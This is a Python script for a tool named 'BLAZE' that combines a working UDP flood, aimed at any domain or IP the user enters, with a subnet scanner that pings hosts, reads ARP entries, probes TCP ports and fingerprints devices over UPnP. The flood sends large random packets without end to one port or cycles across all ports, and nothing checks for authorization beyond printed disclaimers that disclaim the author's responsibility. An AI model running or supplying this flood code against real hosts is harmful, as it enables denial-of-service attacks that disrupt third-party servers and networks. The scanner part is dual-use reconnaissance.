import sys
import subprocess

# --- Auto-install required modules if missing ---
required = ["colorama", "tabulate", "tqdm", "validators"]

for pkg in required:
    try:
        __import__(pkg)
    except ImportError:
        print(f"📦 Installing missing package: {pkg}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

# Now safe to import them

import os
import socket
import random
import time
import ipaddress
import asyncio
import re
from concurrent.futures import ThreadPoolExecutor
from platform import system
from tabulate import tabulate
from colorama import init, Fore, Style
from tqdm.auto import tqdm
import validators

# Initialize colorama for cross-platform colored output
init()

# Version
VERSION = f"1.8"

# Platform-specific clear command
CLEAR_CMD = 'cls' if system() == "Windows" else 'clear'

# Socket setup for UDP flood
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Common TCP ports for scanning (expanded for better device detection)
COMMON_PORTS = [
    0, 1, 7, 20, 21, 22, 23, 25, 53, 80, 110, 135, 143, 443, 445, 465, 587, 631,
    993, 995, 1023, 1900, 2869, 3389, 3702, 5353, 5555, 8009, 62078, 49152
]

# Simple OUI database for device type inference
OUI_DATABASE = {
    '00:04:4B': ('NVIDIA', 'TV'),           # NVIDIA Shield TV
    '00:14:22': ('Generic', 'Computer'),    # Common for PCs
    '00:16:17': ('Dell', 'Computer'),
    '00:18:F3': ('ASUSTek', 'Computer/Router'),
    '00:24:D7': ('Intel', 'Computer'),
    '00:50:56': ('VMware', 'Computer'),
    '00:D0:59': ('Ambit', 'Router'),
    '08:00:27': ('VirtualBox', 'Computer'),
    '10:2F:6B': ('Microsoft', 'Computer'),
    '14:FE:B5': ('Dell', 'Computer'),
    '24:F5:A2': ('Apple', 'Smartphone'),
    '28:FF:3C': ('Apple', 'Smartphone'),
    '38:D5:47': ('Apple', 'Smartphone'),
    '3C:D0:F8': ('Samsung', 'Smartphone'),  # Prioritize smartphone for Samsung
    '50:2B:73': ('Samsung', 'Smartphone'),
    '60:02:92': ('Microsoft', 'Computer'),
    '68:3C:7D': ('Samsung', 'Smartphone'),
    '70:2E:22': ('Apple', 'Smartphone'),
    '80:00:10': ('Samsung', 'Smartphone'),
    'A0:B1:C2': ('Generic', 'Other/'),
    'B0:7F:B9': ('Netgear', 'Router'),
    'B8:27:EB': ('Raspberry Pi', 'Computer'),
    'D8:9E:F3': ('Samsung', 'Smartphone'),
    'F0:27:2D': ('Samsung', 'Smartphone')
}

def clear_screen():
    os.system(CLEAR_CMD)

def validate_ip(ip):
    """Validate if the input is a valid IP address."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_subnet(subnet):
    """Validate if the input is a valid subnet."""
    try:
        ipaddress.IPv4Network(subnet, strict=False)
        return True
    except ValueError:
        return False

def resolve_domain(domain):
    """Resolve domain to IP address."""
    if not validators.domain(domain):
        return None
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror:
        return None

def display_menu():
    """Display the main menu with feather logo."""
    clear_screen()
    print(f"{Fore.CYAN}")
    art = fr"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⠤⢤⣀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠒⢋⣉⣀⣠⣄⣀⣈⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣯⠴⠚⠉⠉⠀⠀⠀⠀⣤⠏⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⡇⠁⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⡿⠿⢛⠁⠁⣸⠀⠀⠀⠀⠀⣤⣾⠵⠚⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⡀⠀⣠⠀⡇⢧⠀⠀⢀⣠⡾⡇⠀⠀⠀⠀⠀⣠⣴⠿⠋⠁⠀⠀⠀⠀⠘⣿⠀⣀⡠⠞⠛⠁⠂⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⣻⡦⣞⡿⣷⠸⣄⣡⢾⡿⠁⠀⠀⠀⣀⣴⠟⠋⠁⠀⠀⠀⠀⠐⠠⡤⣾⣙⣶⡶⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣂⡷⠰⣔⣾⣖⣾⡷⢿⣐⣀⣀⣤⢾⣋⠁⠀⠀⠀⣀⢀⣀⣀⣀⣀⠀⢀⢿⠑⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠠⡦⠴⠴⠤⠦⠤⠤⠤⠤⠤⠴⠶⢾⣽⣙⠒⢺⣿⣿⣿⣿⢾⠶⣧⡼⢏⠑⠚⠋⠉⠉⡉⡉⠉⠉⠹⠈⠁⠉⠀⠨⢾⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠂⠐⠀⠀⠀⠈⣇⡿⢯⢻⣟⣇⣷⣞⡛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣆⠀⠀⠀⠀⢠⡷⡛⣛⣼⣿⠟⠙⣧⠅⡄⠀⠀⠀⠀⠀⠀⠰⡆⠀⠀⠀⠀⢠⣾⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⢶⠏⠉⠀⠀⠀⠀⠀⠿⢠⣴⡟⡗⡾⡒⠖⠉⠏⠁⠀⠀⠀⠀⣀⢀⣠⣧⣀⣀⠀⠀⠀⠚⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⢴⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⣠⣷⢿⠋⠁⣿⡏⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣿⢭⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡴⢏⡵⠛⠀⠀⠀⠀⠀⠀⠀⣀⣴⠞⠛⠀⠀⠀⠀⢿⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⢿⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣼⠛⣲⡏⠁⠀⠀⠀⠀⠀⢀⣠⡾⠋⠉⠀⠀⠀⠀⠀⠀⢾⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡴⠟⠀⢰⡯⠄⠀⠀⠀⠀⣠⢴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⡾⠁⠁⠀⠘⠧⠤⢤⣤⠶⠏⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠘⣇⠂⢀⣀⣀⠤⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ B L A Z E⠀⠀
                          V
                         {VERSION}
"""

    print(art)
    print(f"{Style.RESET_ALL}")
    print(f"{Fore.RED}                 === Be Carful. ==={Style.RESET_ALL}")

    print(f"{Fore.YELLOW}For legal, authorized testing only (e.g., penetration testing on owned systems){Style.RESET_ALL}\n")
    
    table = [
        ["1", "Website Domain", "Test a domain with UDP packets (e.g., example.com)"],
        ["2", "IP Address", "Test a specific IP with UDP packets"],
        ["3", "Network Scan", "Scan subnet for live devices and open TCP ports"],
        ["4", "Exit", "Exit the program"],
        ["5", "About", "View tool information"]
    ]
    headers = [f"{Fore.BLUE}Option{Style.RESET_ALL}", f"{Fore.BLUE}Action{Style.RESET_ALL}", f"{Fore.BLUE}Description{Style.RESET_ALL}"]
    print(tabulate(table, headers=headers, tablefmt="grid"))

def display_about():
    """Display the about section."""
    clear_screen()
    # Initialize colorama
    init(autoreset=True)


    print(Fore.CYAN + Style.BRIGHT + " B L A Z E  " + Style.RESET_ALL +
        "is an open-source tool — a digital weapon forged for those authorized to test the strength of their own systems.\n")
    print("Use it to scan, stress, and secure your " +
        Fore.YELLOW + "networks, servers, or devices.\n" + Style.RESET_ALL)
    print(Fore.RED + Style.BRIGHT + "However," + Style.RESET_ALL +
        " this power is not yours to wield freely.")
    print("Use it " + Fore.GREEN + Style.BRIGHT + "only" + Style.RESET_ALL +
        " where you have ownership or explicit permission.")
    print(Fore.RED + "Misuse is illegal" + Style.RESET_ALL +
        " — and every unauthorized action is a line crossed into digital war.\n")

    print(Fore.BLUE + "Know the rules. Stay within them.")
    print(Fore.MAGENTA + Style.BRIGHT + "Test with honor." + Style.RESET_ALL)

    # Disclaimer

    print('')
    print(Fore.WHITE + Style.DIM +
        "Disclaimer: I, the creator or distributor of this tool, claim no responsibility for how it is used.")
    print("You alone are accountable for your actions, legal or otherwise.\n" + Style.RESET_ALL)


# Final manual reset to ensure no lingering styles
    print(Style.RESET_ALL)
    input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")


    clear_screen()

def get_target():
    """Get target IP or subnet from user input."""
    while True:
        display_menu()
        opt = input(f"\n{Fore.GREEN}> Select an option (1-5): {Style.RESET_ALL}").strip()

        if opt == '1':
            domain = input(f"{Fore.GREEN}Enter domain (e.g., example.com): {Style.RESET_ALL}").strip()
            ip = resolve_domain(domain)
            if ip:
                print(f"{Fore.GREEN}Resolved {domain} to {ip}{Style.RESET_ALL}")
                return ip, opt
            else:
                print(f"{Fore.RED}Invalid domain or unable to resolve!{Style.RESET_ALL}")
                time.sleep(2)

        elif opt == '2':
            ip = input(f"{Fore.GREEN}Enter IP address: {Style.RESET_ALL}").strip()
            if validate_ip(ip):
                return ip, opt
            else:
                print(f"{Fore.RED}Invalid IP address!{Style.RESET_ALL}")
                time.sleep(2)

        elif opt == '3':
            subnet = input(f"{Fore.GREEN}Enter subnet (e.g., 192.168.0.1/24): {Style.RESET_ALL}").strip()
            if validate_subnet(subnet):
                return subnet, opt
            else:
                print(f"{Fore.RED}Invalid subnet!{Style.RESET_ALL}")
                time.sleep(2)

        elif opt == '4':
            print(f"{Fore.YELLOW}Exiting...{Style.RESET_ALL}")
            exit()

        elif opt == '5':
            display_about()

        else:
            print(f"{Fore.RED}Invalid choice! Please select 1-5.{Style.RESET_ALL}")
            time.sleep(2)

def get_port_mode():
    """Get port selection mode for UDP flood."""
    while True:
        choice = input(f"{Fore.GREEN}Use a specific port? [y/n]: {Style.RESET_ALL}").strip().lower()
        if choice in ['y', 'yes']:
            while True:
                try:
                    port = int(input(f"{Fore.GREEN}Enter port (1-65535): {Style.RESET_ALL}"))
                    if 1 <= port <= 65535 and port != 1900:
                        return True, port
                    else:
                        print(f"{Fore.RED}Port must be between 1 and 65535 (excluding 1900)!{Style.RESET_ALL}")
                        time.sleep(2)
                except ValueError:
                    print(f"{Fore.RED}Invalid port number!{Style.RESET_ALL}")
                    time.sleep(2)
        elif choice in ['n', 'no']:
            return False, None
        else:
            print(f"{Fore.RED}Invalid choice! Please enter y or n.{Style.RESET_ALL}")
            time.sleep(2)

def ping_ip(ip):
    """Ping one IP to see if it's alive."""
    try:
        cmd = ['ping', '-n', '1', '-w', '200', str(ip)] if system() == "Windows" else ['ping', '-c', '1', '-W', '1', str(ip)]
        result = subprocess.run(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return str(ip) if result.returncode == 0 else None
    except Exception:
        return None

def get_arp_table(subnet):
    """Get IP-to-MAC mappings from ARP table."""
    try:
        net = ipaddress.IPv4Network(subnet, strict=False)
        cmd = ['arp', '-a'] if system() == "Windows" else ['arp', '-n']
        result = subprocess.run(cmd, capture_output=True, text=True)
        arp_table = {}
        
        # Parse ARP output
        if system() == "Windows":
            lines = result.stdout.splitlines()
            for line in lines:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 2 and validate_ip(parts[0]):
                        ip = parts[0]
                        mac = parts[1].replace('-', ':').upper()
                        if net.overlaps(ipaddress.IPv4Network(ip + '/32')):
                            arp_table[ip] = mac
        else:
            lines = result.stdout.splitlines()
            for line in lines:
                match = re.match(r'^(.*?)\s+\((.*?)\)\s+at\s+([0-9a-fA-F:]+)', line)
                if match and validate_ip(match.group(2)):
                    ip = match.group(2)
                    mac = match.group(3).upper()
                    if net.overlaps(ipaddress.IPv4Network(ip + '/32')):
                        arp_table[ip] = mac
        return arp_table
    except Exception as e:
        print(f"{Fore.RED}[!] Error accessing ARP table: {e}{Style.RESET_ALL}")
        return {}

def probe_upnp(ip):
    """Send UPnP SSDP M-SEARCH request to detect device type."""
    try:
        upnp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        upnp_sock.settimeout(1)
        message = (
            b"M-SEARCH * HTTP/1.1\r\n"
            b"HOST: 239.255.255.250:1900\r\n"
            b"MAN: \"ssdp:discover\"\r\n"
            b"MX: 1\r\n"
            b"ST: ssdp:all\r\n"
            b"\r\n"
        )
        upnp_sock.sendto(message, (ip, 1900))
        response, _ = upnp_sock.recvfrom(1024)
        upnp_sock.close()
        response_str = response.decode('utf-8', errors='ignore').lower()
        if 'server:' in response_str or 'description:' in response_str:
            if 'tv' in response_str or 'media' in response_str:
                return "TV", f"UPnP response contains TV/Media indicators"
            elif 'iot' in response_str or 'device' in response_str:
                return "IoT", f"UPnP response contains IoT indicators"
            return "UPnP Device", f"UPnP response received"
        return None, None
    except:
        return None, None

def get_hostname(ip):
    """Try to get hostname from IP."""
    try:
        return socket.gethostbyaddr(ip)[0]
    except socket.herror:
        return "Unknown"

def infer_device_type(mac, hostname, ports, ip):
    """Infer device type based on MAC OUI, hostname, ports, and UPnP."""
    device_type = "Other"
    reasons = []

    # UPnP probe
    upnp_type, upnp_reason = probe_upnp(ip)
    if upnp_type:
        device_type = upnp_type
        reasons.append(upnp_reason)

    # OUI-based inference
    oui = mac.replace(':', '').upper()[:6] if mac != "Unknown" else None
    if oui and oui in OUI_DATABASE and not upnp_type:
        manufacturer, oui_type = OUI_DATABASE[oui]
        reasons.append(f"OUI {oui} ({manufacturer}) suggests {oui_type}")
        device_type = oui_type

    # Hostname-based inference
    hostname_lower = hostname.lower()
    if "phone" in hostname_lower or "mobile" in hostname_lower or "android" in hostname_lower or "iphone" in hostname_lower:
        device_type = "Smartphone"
        reasons.append(f"Hostname '{hostname}' suggests Smartphone")
    elif "pc" in hostname_lower or "desktop" in hostname_lower or "laptop" in hostname_lower:
        device_type = "Computer"
        reasons.append(f"Hostname '{hostname}' suggests Computer")
    elif "tv" in hostname_lower or "smarttv" in hostname_lower:
        device_type = "TV"
        reasons.append(f"Hostname '{hostname}' suggests TV")
    elif "fridge" in hostname_lower or "refrigerator" in hostname_lower:
        device_type = "Fridge"
        reasons.append(f"Hostname '{hostname}' suggests Fridge")
    elif "router" in hostname_lower or "gateway" in hostname_lower:
        device_type = "Router"
        reasons.append(f"Hostname '{hostname}' suggests Router")

    # Port-based inference
    if 22 in ports or 3389 in ports or 135 in ports:  # SSH, RDP, RPC
        device_type = "Computer"
        reasons.append(f"Ports {ports} suggest Computer (SSH/RDP/RPC)")
    elif 5555 in ports or 62078 in ports or 3702 in ports:  # ADB, DeX, Smart View
        device_type = "Smartphone"
        reasons.append(f"Ports {ports} suggest Smartphone (ADB/DeX/Smart View)")
    elif 445 in ports:  # SMB
        device_type = "Computer"
        reasons.append(f"Port 445 suggests Computer (SMB)")
    elif 1900 in ports or 2869 in ports or 49152 in ports:  # UPnP/DLNA/IoT
        device_type = "TV" if device_type != "Smartphone" else device_type
        reasons.append(f"Ports {ports} suggest TV or IoT")
    elif 631 in ports:  # IPP
        device_type = "Printer" if device_type == "Other" else device_type
        reasons.append(f"Port 631 suggests Printer")
    elif 5353 in ports:  # mDNS
        device_type = "Smartphone" if device_type == "Other" else device_type
        reasons.append(f"Port 5353 suggests Smartphone or TV (mDNS)")

    # Refine Samsung devices
    if oui in OUI_DATABASE and OUI_DATABASE[oui][0] == "Samsung" and device_type not in ["TV", "Fridge"]:
        device_type = "Smartphone"
        reasons.append(f"Samsung OUI defaults to Smartphone")

    # Debug output
    if reasons:
        print(f"{Fore.YELLOW}[*] Device type for {mac or 'Unknown MAC'}: {device_type} ({', '.join(reasons)}){Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[*] Device type for {mac or 'Unknown MAC'}: {device_type} (no specific indicators){Style.RESET_ALL}")

    return device_type

async def scan_ports(ip):
    """Async TCP port scanner."""
    open_ports = []

    async def check_port(port):
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port),
                timeout=0.3
            )
            writer.close()
            await writer.wait_closed()
            return port
        except:
            return None

    tasks = [check_port(port) for port in COMMON_PORTS]
    results = await asyncio.gather(*tasks)
    open_ports = [port for port in results if port]
    return open_ports

def scan_devices(subnet):
    """Scan subnet for live devices, MAC addresses, and open TCP ports."""
    print(f"{Fore.CYAN}[*] Scanning subnet {subnet}...{Style.RESET_ALL}")

    net = ipaddress.IPv4Network(subnet, strict=False)
    ip_list = list(net.hosts())
    total_ips = len(ip_list)

    # Get ARP table for MAC addresses
    print(f"{Fore.YELLOW}[*] Retrieving ARP table...{Style.RESET_ALL}")
    arp_table = get_arp_table(subnet)

    # Ping in parallel with progress indicator
    alive_ips = set()
    with ThreadPoolExecutor(max_workers=100) as executor:
        for i, result in enumerate(executor.map(ping_ip, ip_list), 1):
            if result:
                alive_ips.add(result)
                print(f"{Fore.YELLOW}[*] Found {result} via ping{Style.RESET_ALL}")
            print(f"\r{Fore.YELLOW}[*] Progress: {i}/{total_ips} IPs scanned ({len(alive_ips)} alive via ping){Style.RESET_ALL}", end="")

    # Add devices from ARP table
    for ip in arp_table:
        if net.overlaps(ipaddress.IPv4Network(ip + '/32')) and ip not in alive_ips:
            alive_ips.add(ip)
            print(f"{Fore.YELLOW}[*] Found {ip} via ARP{Style.RESET_ALL}")
    
    alive_ips = sorted(list(alive_ips))  # Sort for consistent output
    print(f"\n{Fore.GREEN}[+] Found {len(alive_ips)} alive device(s){Style.RESET_ALL}")

    # Get hostnames, ports, and device types
    results = []
    for i, ip in enumerate(alive_ips, 1):
        print(f"{Fore.YELLOW}[*] Scanning ports for {ip} ({i}/{len(alive_ips)}){Style.RESET_ALL}")
        hostname = get_hostname(ip)
        ports = asyncio.run(scan_ports(ip))
        mac = arp_table.get(ip, "Unknown")
        device_type = infer_device_type(mac, hostname, ports, ip)
        results.append((ip, hostname, ports, mac, device_type))

    # Display results
    print(f"\n{Fore.CYAN}=== Scan Results ==={Style.RESET_ALL}")
    table = []
    for ip, hostname, ports, mac, device_type in results:
        ports_str = ", ".join(map(str, ports)) if ports else "None"
        table.append([ip, hostname, ports_str, mac, device_type])
    
    headers = [
        f"{Fore.BLUE}IP Address{Style.RESET_ALL}",
        f"{Fore.BLUE}Hostname{Style.RESET_ALL}",
        f"{Fore.BLUE}Open Ports{Style.RESET_ALL}",
        f"{Fore.BLUE}MAC Address{Style.RESET_ALL}",
        f"{Fore.BLUE}Device Type{Style.RESET_ALL}"
    ]
    print(tabulate(table, headers=headers, tablefmt="grid", stralign="left"))

def udp_flood(target, port_mode, port):
    """Perform UDP flood on target."""
    print(f"{Fore.CYAN}[*] Starting UDP flood on {target}...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Press Ctrl+C to stop...{Style.RESET_ALL}")

    sent = 0
    try:
        if port_mode:
            if port < 2:
                port = 2
            elif port == 65534:
                port = 2
            elif port == 1900:
                port = 1901
                
            with tqdm(desc="Packets sent", unit="pkts") as pbar:
                while True:
                    sock.sendto(bytes, (target, port))
                    sent += 1
                    pbar.update(1)
                    print(f"\r{Fore.GREEN}Sent {sent} packets to {target} through port {port}{Style.RESET_ALL}", end="")
        else:
            port = 2
            with tqdm(desc="Packets sent", unit="pkts") as pbar:
                while True:
                    if port == 65534:
                        port = 1
                    elif port == 1900:
                        port = 1901
                    sock.sendto(bytes, (target, port))
                    sent += 1
                    pbar.update(1)
                    print(f"\r{Fore.GREEN}Sent {sent} packets to {target} through port {port}{Style.RESET_ALL}", end="")
                    port += 1
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Stopped by user. Total packets sent: {sent}{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Error: {e}{Style.RESET_ALL}")
    finally:
        print(f"{Fore.CYAN}=== Test Complete ==={Style.RESET_ALL}")
        print(f"Target: {target}")
        print(f"Total packets sent: {sent}")
        print(f"Port mode: {'Specific port ' + str(port) if port_mode else 'All ports'}")

def main():
    clear_screen()
    target, opt = get_target()
    
    if opt == '3':
        scan_devices(target)
        return
    
    # Get port mode for UDP flood
    port_mode, port = get_port_mode()
    
    # Start UDP flood
    clear_screen()
    udp_flood(target, port_mode, port)

if __name__ == "__main__":
    main()